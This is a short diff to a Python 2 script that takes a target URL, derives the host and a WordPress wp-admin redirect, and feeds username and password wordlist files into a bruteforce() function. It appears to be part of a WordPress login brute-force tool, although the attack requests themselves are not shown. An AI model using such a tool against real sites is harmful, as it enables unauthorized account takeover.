@@ -70,13 +70,20 @@ def find_between( s, first, last ):
 
 def url_config():
 	global login_URL
+	global host
+	global redirect
 	login_URL = raw_input("\n Enter target URL: ")
+	host = find_between(login_URL,"//","/")
+	redirect = 'http://%s/wp/wordpress/wp-admin/' % (host)
 	print ""
 
 def bruteforce():
 	global aPlace
 	global bPlace
 	global keyword
+	global host
+	global redirect
+	global login_URL
 
 	text_file = open("list.txt", "r")
 	text_file2 = open("pw.txt", "r")
